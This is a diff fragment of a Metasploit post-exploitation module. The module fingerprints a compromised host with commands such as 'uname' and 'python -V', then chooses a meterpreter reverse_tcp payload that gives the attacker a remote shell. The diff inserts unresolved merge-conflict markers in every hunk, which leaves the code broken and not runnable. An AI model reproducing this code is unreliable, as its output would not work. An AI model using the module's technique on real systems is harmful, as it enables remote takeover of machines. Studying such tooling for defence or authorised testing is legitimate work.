@@ -41,11 +41,15 @@ class Metasploit3 < Msf::Post
       OptEnum.new('WIN_TRANSFER',
         [true, 'Which method to try first to transfer files on a Windows target.', 'POWERSHELL', ['POWERSHELL', 'VBS']]),
       OptString.new('PAYLOAD_OVERRIDE',
+<<<<<<< HEAD
         [false, 'Define the payload to use (meterpreter/reverse_tcp by default) .', nil]),
       OptString.new('BOURNE_PATH',
         [false, 'Remote path to drop binary']),
       OptString.new('BOURNE_FILE',
         [false, 'Remote filename to use for dropped binary'])
+=======
+        [false, 'Define the payload to use (meterpreter/reverse_tcp by default) .', nil])
+>>>>>>> origin/4.11.2_release_pre-rails4
     ], self.class)
     deregister_options('PERSIST', 'PSH_OLD_METHOD', 'RUN_WOW64')
   end
@@ -93,7 +97,11 @@ class Metasploit3 < Msf::Post
       vprint_status("Platform: Solaris")
     else
       # Find the best fit, be specific with uname to avoid matching hostname or something else
+<<<<<<< HEAD
       target_info = cmd_exec('uname -ms')
+=======
+      target_info = cmd_exec('uname -mo')
+>>>>>>> origin/4.11.2_release_pre-rails4
       if target_info =~ /linux/i && target_info =~ /86/
         # Handle linux shells that were identified as 'unix'
         platform = 'linux'
@@ -101,11 +109,15 @@ class Metasploit3 < Msf::Post
         lplat = [Msf::Platform::Linux]
         larch = [ARCH_X86]
         vprint_status("Platform: Linux")
+<<<<<<< HEAD
       elsif target_info =~ /darwin/i
         platform = 'python'
         payload_name = 'python/meterpreter/reverse_tcp'
         vprint_status("Platform: OS X")
       elsif cmd_exec('python -V 2>&1') =~ /Python (2|3)\.(\d)/
+=======
+      elsif cmd_exec('python -V') =~ /Python (2|3)\.(\d)/
+>>>>>>> origin/4.11.2_release_pre-rails4
         # Generic fallback for OSX, Solaris, Linux/ARM
         platform = 'python'
         payload_name = 'python/meterpreter/reverse_tcp'
